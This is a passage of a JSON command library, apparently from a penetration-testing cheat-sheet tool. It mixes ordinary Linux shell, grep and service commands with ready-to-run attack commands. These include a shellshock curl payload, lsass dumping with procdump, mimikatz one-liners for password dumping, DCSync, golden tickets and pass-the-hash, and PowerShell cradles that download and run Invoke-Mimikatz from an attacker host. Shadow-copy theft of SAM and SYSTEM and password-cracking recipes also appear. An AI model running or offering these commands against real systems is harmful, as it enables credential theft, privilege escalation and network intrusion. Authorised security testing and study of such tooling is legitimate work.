tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor", "tags": "[\"sql injection\"]", "more_info_url": null}, {"name": "compile windows PE 32 executable on linux", "description": "", "executable_type": "custom", "executable_path": "i686-w64-mingw32-gcc", "arguments": "<source.c> -lws2_32 -o <output.exe>", "tags": "[\"compile\"]", "more_info_url": null}, {"name": "change multiple space to one", "description": "", "executable_type": "custom", "executable_path": "sed", "arguments": "'s/  */ /g'", "tags": "[\"sed\"]", "more_info_url": null}, {"name": "delete the last char", "description": "", "executable_type": "custom", "executable_path": "sed", "arguments": "'s/.$//g'", "tags": "[\"sed\"]", "more_info_url": null}, {"name": "grep classic", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "<word> <file>", "tags": null, "more_info_url": null}, {"name": "grep without case", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-i <word> <file>", "tags": null, "more_info_url": null}, {"name": "grep with file found", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "<word> <file> -H", "tags": null, "more_info_url": null}, {"name": "grep recursive on extension", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-rn --include \"*.<extension>\" <word>", "tags": null, "more_info_url": null}, {"name": "grep word A or B", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-e \"\\(<word_A>\\|<word_B>\\)\" <file>", "tags": null, "more_info_url": null}, {"name": "Extract md5 hashes ({32})", "description": "", "executable_type": "custom", "executable_path": "egrep", "arguments": "-oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt", "tags": null, "more_info_url": null}, {"name": "Extract sha1 ({40})", "description": "", "executable_type": "custom", "executable_path": "egrep", "arguments": "-oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{40}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{40}' > sha1-hashes.txt", "tags": null, "more_info_url": null}, {"name": "Extract sha256({64})", "description": "", "executable_type": "custom", "executable_path": "egrep", "arguments": "-oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{64}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{64}' > sha256-hashes.txt", "tags": null, "more_info_url": null}, {"name": "Extract sha512({128})", "description": "", "executable_type": "custom", "executable_path": "egrep", "arguments": "-oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{128}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{128}' > sha512-hashes.txt", "tags": null, "more_info_url": null}, {"name": "Extract valid MySQL-Old hashes", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-e \"[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}\" *.txt > mysql-old-hashes.txt", "tags": null, "more_info_url": null}, {"name": "Extract blowfish hashes", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-e \"$2a\\$\\08\\$(.){75}\" *.txt > blowfish-hashes.txt", "tags": null, "more_info_url": null}, {"name": "Extract Joomla hashes", "description": "", "executable_type": "custom", "executable_path": "egrep", "arguments": "-o \"([0-9a-zA-Z]{32}):(w{16,32})\" *.txt > joomla.txt", "tags": null, "more_info_url": null}, {"name": "Extract VBulletin hashes", "description": "", "executable_type": "custom", "executable_path": "egrep", "arguments": "-o \"([0-9a-zA-Z]{32}):(S{3,32})\" *.txt > vbulletin.txt", "tags": null, "more_info_url": null}, {"name": "Extract phpBB3-MD5", "description": "", "executable_type": "custom", "executable_path": "egrep", "arguments": "-o '$H$S{31}' *.txt > phpBB3-md5.txt", "tags": null, "more_info_url": null}, {"name": "Extract Wordpress-MD5", "description": "", "executable_type": "custom", "executable_path": "egrep", "arguments": "-o '$P$S{31}' *.txt > wordpress-md5.txt", "tags": null, "more_info_url": null}, {"name": "Extract Drupal 7", "description": "", "executable_type": "custom", "executable_path": "egrep", "arguments": "-o '$S$S{52}' *.txt > drupal-7.txt", "tags": null, "more_info_url": null}, {"name": "Extract old Unix-md5", "description": "", "executable_type": "custom", "executable_path": "egrep", "arguments": "-o '$1$w{8}S{22}' *.txt > md5-unix-old.txt", "tags": null, "more_info_url": null}, {"name": "Extract md5-apr1", "description": "", "executable_type": "custom", "executable_path": "egrep", "arguments": "-o '$apr1$w{8}S{22}' *.txt > md5-apr1.txt", "tags": null, "more_info_url": null}, {"name": "Extract sha512crypt, SHA512(Unix)", "description": "", "executable_type": "custom", "executable_path": "egrep", "arguments": "-o '$6$w{8}S{86}' *.txt > sha512crypt.txt", "tags": null, "more_info_url": null}, {"name": "Extract emails from file", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-E -o \"\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,6}\\b\" <file>", "tags": null, "more_info_url": null}, {"name": "Extract valid IP addresses", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\" <file>", "tags": null, "more_info_url": null}, {"name": "Extract passwords", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-i \"pwd\\|passw\" <file>", "tags": null, "more_info_url": null}, {"name": "Extract users", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-i \"user\\|invalid\\|authentication\\|login\" <file>", "tags": null, "more_info_url": null}, {"name": "Extract HTTP URLS", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-i http | grep -shoP 'http.*?[\" >]' <file> > http-urls.txt", "tags": null, "more_info_url": null}, {"name": "Create a QR code with some content", "description": "", "executable_type": "custom", "executable_path": "echo", "arguments": "<content> | curl -F-=\\<- qrenco.de", "tags": "[\"qr code\"]", "more_info_url": null}, {"name": "convert JSON to YAML", "description": "", "executable_type": "custom", "executable_path": "#", "arguments": "linux", "tags": "[\"misc\", \"linux\"]", "more_info_url": null}, {"name": "Convert multi line to one line", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "<pattern> <file> | tr '\\n' ' '", "tags": "[\"misc\", \"linux\"]", "more_info_url": null}, {"name": "grep nmap protocol from file and get ips in one line", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "<pattern> <file>.gnmap|cut -d ' ' -f 2 | tr '\\n' ' '", "tags": "[\"misc\", \"linux\"]", "more_info_url": null}, {"name": "find service on port", "description": "", "executable_type": "custom", "executable_path": "amap", "arguments": "-d <ip> <port>", "tags": "[\"scanner\"]", "more_info_url": null}, {"name": "List cron jobs", "description": "", "executable_type": "custom", "executable_path": "crontab", "arguments": "-l", "tags": "[\"crontab\", \"schedule\"]", "more_info_url": null}, {"name": "Edit cron job", "description": "", "executable_type": "custom", "executable_path": "crontab", "arguments": "-e", "tags": "[\"crontab\", \"schedule\"]", "more_info_url": null}, {"name": "Re-call last input with sudo", "description": "", "executable_type": "custom", "executable_path": "sudo", "arguments": "!!", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Help", "description": "", "executable_type": "custom", "executable_path": "help", "arguments": "cd / help dir (...)", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Finding Help", "description": "", "executable_type": "custom", "executable_path": "apropos", "arguments": "directory / apropos search (...)", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Define custom startup screen", "description": "", "executable_type": "custom", "executable_path": "sudo", "arguments": "nano /etc/motd", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Run a script as background process", "description": "", "executable_type": "custom", "executable_path": "<process>", "arguments": "&", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "List all running processes", "description": "", "executable_type": "custom", "executable_path": "ps", "arguments": "-A", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Kill a running process", "description": "", "executable_type": "custom", "executable_path": "killall", "arguments": "<Process-name>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "show process command", "description": "", "executable_type": "custom", "executable_path": "ps", "arguments": "-ef | grep apache | grep -v grep", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Change group", "description": "", "executable_type": "custom", "executable_path": "chgrp", "arguments": "<group-name-from> <group-name-to>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "List directory contents by size", "description": "", "executable_type": "custom", "executable_path": "ls", "arguments": "-Slrh", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "List all directory contents sorted by time edited reverse", "description": "", "executable_type": "custom", "executable_path": "ls", "arguments": "-altr", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "List directory (wildcard matching)", "description": "", "executable_type": "custom", "executable_path": "ls", "arguments": "*.<txt>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "List all files of type", "description": "", "executable_type": "custom", "executable_path": "find", "arguments": ". -name *.<txt> -print", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Go back to previous directory", "description": "", "executable_type": "custom", "executable_path": "cd", "arguments": "-", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Make (empty) directory", "description": "", "executable_type": "custom", "executable_path": "mkdir", "arguments": "<dirname>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Remove (empty) directory", "description": "", "executable_type": "custom", "executable_path": "rmdir", "arguments": "<dirname>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Remove directory with all contents without prompt", "description": "", "executable_type": "custom", "executable_path": "rm", "arguments": "-rf <dirname>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Remove directory contents and keep directory", "description": "", "executable_type": "custom", "executable_path": "rm", "arguments": "-rf *", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Change directory", "description": "", "executable_type": "custom", "executable_path": "cd", "arguments": "<dirname>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Create symlink", "description": "", "executable_type": "custom", "executable_path": "ln", "arguments": "-s <source-dirname> <destination-dirname>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Update symlink", "description": "", "executable_type": "custom", "executable_path": "ln", "arguments": "-sfn <source-dirname> <destination-dirname>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Remove symlink", "description": "", "executable_type": "custom", "executable_path": "unlink", "arguments": "<sample-dirname>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Make (empty) file", "description": "", "executable_type": "custom", "executable_path": "touch", "arguments": "<filename-txt>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Copy file", "description": "", "executable_type": "custom", "executable_path": "cp", "arguments": "<filename> <file-copyname>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Copy/Page folder with content", "description": "", "executable_type": "custom", "executable_path": "cp", "arguments": "-a <old-folder>/ <new-folder>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Move/Rename file", "description": "", "executable_type": "custom", "executable_path": "mv", "arguments": "<current-filename-path> <new-filename-path>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Move/Rename file and prompt before overwriting an existing file", "description": "", "executable_type": "custom", "executable_path": "mv", "arguments": "-i <current-filename> <new-filename>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Remove file", "description": "", "executable_type": "custom", "executable_path": "rm", "arguments": "<filename-txt>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Write to file (will overwrite existing content)", "description": "", "executable_type": "custom", "executable_path": "cat", "arguments": "> <filename-txt>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Search for a filename-(not content!) in the current directory", "description": "", "executable_type": "custom", "executable_path": "find", "arguments": "<filename-txt>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Search for a string inside all files in the current directory and subdrectories", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-r <string> *", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Search and replace within file", "description": "", "executable_type": "custom", "executable_path": "sed", "arguments": "-i s/<original-text>/<new-text>/g <filename-txt>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "MD5 hash for files", "description": "", "executable_type": "custom", "executable_path": "md5sum", "arguments": "<filename-txt>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "MD5 hash for folders", "description": "", "executable_type": "custom", "executable_path": "tar", "arguments": "c <folder> | md5sum", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Encrypt file", "description": "", "executable_type": "custom", "executable_path": "openssl", "arguments": "enc -aes-256-cbc -e -in <sample-filename-txt> -out <sample-encrypted-txt>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Decrypt file", "description": "", "executable_type": "custom", "executable_path": "openssl", "arguments": "enc -aes-256-cbc -d -in <sample-encrypted> -out <sample-filename>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Copy file from server to local", "description": "", "executable_type": "custom", "executable_path": "scp", "arguments": "<username-remote>@<ip>:<file-to-send-path> <path-to-recieve>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Copy file from local to server", "description": "", "executable_type": "custom", "executable_path": "scp", "arguments": "<file-to-send> <username-remote>@<ip>:<where-to-put>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Escape files with spaces in name like this", "description": "", "executable_type": "custom", "executable_path": "<path-to-file>\\\\\\", "arguments": "<name-png>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Show disc space", "description": "", "executable_type": "custom", "executable_path": "df", "arguments": "-h", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Show disc space (inodes)", "description": "", "executable_type": "custom", "executable_path": "df", "arguments": "-i", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Show disc space for current directory", "description": "", "executable_type": "custom", "executable_path": "du", "arguments": "-hs", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Current processes (also CPS usage)", "description": "", "executable_type": "custom", "executable_path": "top", "arguments": "or htop", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Show running php processes", "description": "", "executable_type": "custom", "executable_path": "ps", "arguments": "aux | grep php", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Monitor error log (stream as file grows)", "description": "", "executable_type": "custom", "executable_path": "tail", "arguments": "error.log -f -n 0", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Start application", "description": "", "executable_type": "custom", "executable_path": "xdg-open", "arguments": "<programme>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Register variable", "description": "", "executable_type": "custom", "executable_path": "export", "arguments": "<TESTING>=<Variable-text>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Echo variable", "description": "", "executable_type": "custom", "executable_path": "echo", "arguments": "$<Variable>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Unset variable", "description": "", "executable_type": "custom", "executable_path": "unset", "arguments": "<Variable>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Write to file", "description": "", "executable_type": "custom", "executable_path": "echo", "arguments": "<Hello> > <hello-txt>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Append content from a file to another file", "description": "", "executable_type": "custom", "executable_path": "cat", "arguments": "<file1-txt> >> <file2-txt>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Add the amount of lines, words, and characters to file2-txt", "description": "", "executable_type": "custom", "executable_path": "cat", "arguments": "<file1-txt> | <word-count> | cat > <file2-txt>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Sort the content of a file (like cat)", "description": "", "executable_type": "custom", "executable_path": "sort", "arguments": "<hello-txt>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Save to sorted content to a new file", "description": "", "executable_type": "custom", "executable_path": "cat", "arguments": "<file1-txt> | sort > <sorted-file1-txt>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Sort and remove duplicates and save to a new file", "description": "", "executable_type": "custom", "executable_path": "sort", "arguments": "<file1-txt> | uniq > <uniq-file1-txt>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "shellshock", "description": "", "executable_type": "custom", "executable_path": "curl", "arguments": "-A \"() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id\" <url>", "tags": "[\"shell\", \"linux\"]", "more_info_url": null}, {"name": "Start service", "description": "", "executable_type": "custom", "executable_path": "systemctl", "arguments": "start <service_inactive>", "tags": "[\"systemctl\", \"service\"]", "more_info_url": null}, {"name": "Stop service", "description": "", "executable_type": "custom", "executable_path": "systemctl", "arguments": "stop <service_active>", "tags": "[\"systemctl\", \"service\"]", "more_info_url": null}, {"name": "Enable service", "description": "", "executable_type": "custom", "executable_path": "systemctl", "arguments": "enable <service_disabled>", "tags": "[\"systemctl\", \"service\"]", "more_info_url": null}, {"name": "Disable service", "description": "", "executable_type": "custom", "executable_path": "systemctl", "arguments": "disable <service_enabled>", "tags": "[\"systemctl\", \"service\"]", "more_info_url": null}, {"name": "Restart service", "description": "", "executable_type": "custom", "executable_path": "systemctl", "arguments": "restart <service>", "tags": "[\"systemctl\", \"service\"]", "more_info_url": null}, {"name": "Reload service", "description": "", "executable_type": "custom", "executable_path": "systemctl", "arguments": "reload <service_active>", "tags": "[\"systemctl\", \"service\"]", "more_info_url": null}, {"name": "Service status", "description": "", "executable_type": "custom", "executable_path": "systemctl", "arguments": "status <service>", "tags": "[\"systemctl\", \"service\"]", "more_info_url": null}, {"name": "List running services", "description": "", "executable_type": "custom", "executable_path": "systemctl", "arguments": "list-units --type=service --state=running", "tags": "[\"systemctl\", \"service\"]", "more_info_url": null}, {"name": "List enabled services", "description": "", "executable_type": "custom", "executable_path": "systemctl", "arguments": "list-unit-files --type=service --state=enabled", "tags": "[\"systemctl\", \"service\"]", "more_info_url": null}, {"name": "List disabled services", "description": "", "executable_type": "custom", "executable_path": "systemctl", "arguments": "list-unit-files --type=service --state=disabled", "tags": "[\"systemctl\", \"service\"]", "more_info_url": null}, {"name": "List services", "description": "", "executable_type": "custom", "executable_path": "service", "arguments": "--status-all", "tags": null, "more_info_url": null}, {"name": "Status of  a service", "description": "", "executable_type": "custom", "executable_path": "service", "arguments": "<service_name> status", "tags": null, "more_info_url": null}, {"name": "Start a service", "description": "", "executable_type": "custom", "executable_path": "service", "arguments": "<service_name> start", "tags": null, "more_info_url": null}, {"name": "Stop a service", "description": "", "executable_type": "custom", "executable_path": "service", "arguments": "<service_name> stop", "tags": null, "more_info_url": null}, {"name": "Restart a service", "description": "", "executable_type": "custom", "executable_path": "service", "arguments": "<service_name> restart", "tags": null, "more_info_url": null}, {"name": "procdump - dump lsass - local", "description": "", "executable_type": "custom", "executable_path": "C:\\procdump.exe", "arguments": "-accepteula -ma lsass.exe lsass.dmp", "tags": "[\"procdump\", \"lsass\", \"credentials\"]", "more_info_url": null}, {"name": "procdump - dump lsass - remote", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "use Z: https://live.sysinternals.com; Z:\\procdump.exe -accepteula -ma lsass.exe lsass.dmp", "tags": "[\"procdump\", \"lsass\", \"credentials\"]", "more_info_url": null}, {"name": "laps toolkit", "description": "https://github.com/leoloobeek/LAPSToolkit", "executable_type": "custom", "executable_path": "(new-object", "arguments": "system.net.webclient).downloadstring('http://<lhost>/LAPSToolkit.ps1') | IEX; Import-Module .\\LAPSToolkit.ps1", "tags": "[\"LAPS\", \"passwords\"]", "more_info_url": "https://github.com/leoloobeek/LAPSToolkit"}, {"name": "laps toolkit - Get laps computer", "description": "", "executable_type": "custom", "executable_path": "Import-Module", "arguments": ".\\LAPSToolkit.ps1; Get-LAPSComputers", "tags": "[\"LAPS\", \"passwords\"]", "more_info_url": null}, {"name": "laps toolkit - find LAPS Delegated Groups", "description": "", "executable_type": "custom", "executable_path": "Import-Module", "arguments": ".\\LAPSToolkit.ps1; Find-LAPSDelegatedGroups", "tags": "[\"LAPS\", \"passwords\"]", "more_info_url": null}, {"name": "laps toolkit - Find users with Extended rights", "description": "", "executable_type": "custom", "executable_path": "Import-Module", "arguments": ".\\LAPSToolkit.ps1; Find-AdmPwdExtendedRights", "tags": "[\"LAPS\", \"passwords\"]", "more_info_url": null}, {"name": "lazagne dump all passwords (trig av)", "description": "", "executable_type": "custom", "executable_path": "lazagne.exe", "arguments": "all", "tags": "[\"lazagne\", \"dump password\"]", "more_info_url": null}, {"name": "mimikatz onliner", "description": "", "executable_type": "custom", "executable_path": "mimikatz.exe", "arguments": "\"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" \"exit\"", "tags": "[\"mimikatz\", \"passwords\"]", "more_info_url": null}, {"name": "powershell - load mimikatz", "description": "https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1", "executable_type": "custom", "executable_path": "(new-object", "arguments": "system.net.webclient).downloadstring('http://<lhost>/Invoke-Mimikatz.ps1') | IEX;\\\nInvoke mimikatz", "tags": "[\"mimikatz\", \"passwords\"]", "more_info_url": "https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1"}, {"name": "mimikatz disable PPL and dump passwords", "description": "", "executable_type": "custom", "executable_path": "mimikatz.exe", "arguments": "\"privilege::debug\" \"!+\" \"!processprotect /process:lsass.exe /remove\" \"sekurlsa::logonpasswords\" \"exit\"", "tags": "[\"mimikatz\", \"passwords\"]", "more_info_url": null}, {"name": "mimikatz dcsync - user (krbtgt/Administrator)", "description": "", "executable_type": "custom", "executable_path": "mimikatz.exe", "arguments": "\"privilege::debug\" \"lsadump::dcsync /domain:<domain> /user:<user>\" \"exit\"", "tags": "[\"mimikatz\", \"passwords\"]", "more_info_url": null}, {"name": "mimikatz extract credentials from dump", "description": "", "executable_type": "custom", "executable_path": "mimikatz.exe", "arguments": "\"privilege::debug\" \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords\" \"exit\"", "tags": "[\"mimikatz\", \"passwords\"]", "more_info_url": null}, {"name": "mimikatz extract credentials from shadow copy (1)", "description": "", "executable_type": "custom", "executable_path": "mimikatz.exe", "arguments": "\"lsadump::sam /system:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /security:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY /sam:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM\"", "tags": "[\"mimikatz\", \"passwords\"]", "more_info_url": null}, {"name": "mimikatz extract credentials from shadow copy (2)", "description": "Extract old passwords", "executable_type": "custom", "executable_path": "mimikatz.exe", "arguments": "\"lsadump::secrets /system:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /security:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY\"", "tags": "[\"mimikatz\", \"passwords\"]", "more_info_url": null}, {"name": "extract on hand shadow volume copy", "description": "", "executable_type": "custom", "executable_path": "powershell.exe", "arguments": "\"[System.IO.File]::Copy('\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM', '.\\Desktop\\SYSTEM.bkp');[System.IO.File]::Copy('\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY', '.\\Desktop\\SECURITY.bkp');[System.IO.File]::Copy('\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM', '.\\Desktop\\SAM.bkp')\"", "tags": "[\"mimikatz\", \"passwords\"]", "more_info_url": null}, {"name": "mimikatz extract tickets", "description": "", "executable_type": "custom", "executable_path": "sekurlsa::tickets", "arguments": "/export", "tags": "[\"mimikatz\", \"ad\"]", "more_info_url": null}, {"name": "mimikatz - forest extra SID", "description": "sid : origin domain sid : Get-DomainSID -Domain domainname\nsids :  ExtraSid value (Enterprise Admins SID) : parent SID", "executable_type": "custom", "executable_path": "kerberos::golden", "arguments": "/user:<user> /domain:<domain> /sid:<child_sid> /krbtgt:<krbtgt_ntlm> /sids:<parent_sid>-519 /ptt", "tags": "[\"mimikatz\", \"ad\"]", "more_info_url": null}, {"name": "mimikatz pth to RDP mstsc.exe", "description": "", "executable_type": "custom", "executable_path": "sekurlsa::pth", "arguments": "/user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:\"mstsc.exe /restrictedadmin\"", "tags": "[\"mimikatz\", \"pth\"]", "more_info_url": null}, {"name": "mimikatz pth run powershell remotelly", "description": "Followed by : Enter-PSSession -Computer {<}computer_name}", "executable_type": "custom", "executable_path": "sekurlsa::pth", "arguments": "/user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:powershell", "tags": "[\"mimikatz\", \"pth\"]", "more_info_url": null}, {"name": "john LM", "description": "", "executable_type": "custom", "executable_path": "john", "arguments": "--wordlist=<wordlist> --format=lm hash.txt", "tags": "[\"password recovery\", \"password cracking\"]", "more_info_url": null}, {"name": "john NTLM", "description": "", "executable_type": "custom", "executable_path": "john", "arguments": "--wordlist=<wordlist> --format=nt hash.txt", "tags": "[\"password recovery\", \"password cracking\"]", "more_info_url": null}, {"name": "john NTLMv1", "description": "", "executable_type": "custom", "executable_path": "john", "arguments": "--wordlist=<wordlist> --format=netntlm hash.txt", "tags": "[\"password recovery\", \"password cracking\"]", "more_info_url": null}, {"name": "john NTLMv2", "description": "", "executable_type": "custom", "executable_path": "john", "arguments": "--wordlist=<wordlist> --format=netntlmv2 hash.txt", "tags": "[\"password recovery\", \"password cracking\"]", "more_info_url": null}, {"name": "john ssh convert key ", "description": "", "executable_type": "custom", "executable_path": "python", "arguments": "/usr/share/john/ssh2john.py <ssh_key> > <ssh_hash|sshkey.hash>", "tags": "[\"password recovery\", \"password cracking\"]", "more_info_url": null}, {"name": "john ssh", "description": "", "executable_type": "custom", "executable_path": "john", "arguments": "--wordlist=<wordlist> <ssh_hash|sshkey.hash>", "tags": "[\"password recovery\", \"password cracking\"]", "more_info_url": null}, {"name": "ZIP - fcrackzip", "description": "", "executable_type": "custom", "executable_path": "fcrackzip", "arguments": "-u -D -p <wordlist> <file>.zip", "tags": "[\"bruteforce\", \"crack\", \"files\"]", "more_info_url": null}, {"name": "ZIP - john", "description": "", "executable_type": "custom", "executable_path": "zip2john", "arguments": "<file>.zip > zip.john;\\\njohn zip.john", "tags": "[\"bruteforce\", \"crack\", \"files\"]", "more_info_url": null}, {"name": "7z - 7za", "description": "", "executable_type": "custom", "executable_path": "cat", "arguments": "<wordlist> | 7za t <file>.7z", "tags": "[\"bruteforce\", \"crack\", \"files\"]", "more_info_url": null}, {"name": "7z - john", "description": "", "executable_type": "custom", "executable_path": "./7z2john.pl", "arguments": "<file>.7z > 7zhash.john;\\\njohn 7zhash.john", "tags": "[\"bruteforce\", \"crack\", \"files\"]", "more_info_url": null}, {"name": "PDF - pdfcrack", "description": "", "executable_type": "custom", "executable_path": "pdfcrack", "arguments": "<file>.pdf -w <wordlist>", "tags": "[\"bruteforce\", \"crack\", \"files\"]", "more_info_url": null}, {"name": "PDF decrypt - qpdf", "description": "", "executable_type": "custom", "executable_path": "qpdf", "arguments": "--password=<PASSWORD> --decrypt <encrypted_pdf>.pdf <plaintext_pdf>.pdf", "tags": "[\"bruteforce\", \"crack\", \"files\"]", "more_info_url": null}, {"name": "keepass kdbx - john", "description": "", "executable_type": "custom", "executable_path": "keepass2john", "arguments": "<file>.kdbx > out.kbdx.hashes && john --wordlist <wordlist> out.kbdx.hashes", "tags": "[\"bruteforce\", \"crack\", \"files\"]", "more_info_url": null}, {"name": "XLS PPT DOC - john", "description": "", "executable_type": "custom", "executable_path": "python3", "arguments": "<path_to_john>/run/office2john.py <file>.xls > out.hash && john --wordlist <wordlist> out.hash", "tags": "[\"bruteforce\", \"crack\", \"files\"]", "more_info_url": null}, {"name": "hashcat - basic md5 (joomla/wordpress) - wordlist", "description": "", "executable_type": "custom", "executable_path": "hashcat", "arguments": "-a 0 -m 400 hashes <wordlist>", "tags": "[\"password recovery\", \"password cracking\"]", "more_info_url": null}, {"name": "hashcat - basic md5 (joomla/wordpress) - wordlist with rules", "description": "", "executable_type": "custom", "executable_path": "hashcat", "arguments": "-a 0 -m 400 hashes <wordlist> -r /usr/share/doc/hashcat/rules/best64.rule", "tags": "[\"password recovery\", \"password cracking\"]", "more_info_url": null}, {"name": "hashcat - kerberos ticket (after kerberoasting)", "description": "", "executable_type": "custom", "executable_path": "hashcat", "arguments": "-m 13100 --force -a 0 hashes <wordlist>", "tags": "[\"password recovery\", \"password cracking\"]", "more_info_url": null}, {"name": "hashcat - LM", "description": "", "executable_type": "custom", "executable_path": "hashcat", "arguments": "-m 3000 -a 0 hashes <wordlist>", "tags": "[\"password recovery\", \"password cracking\"]", "more_info_url": null}, {"name": 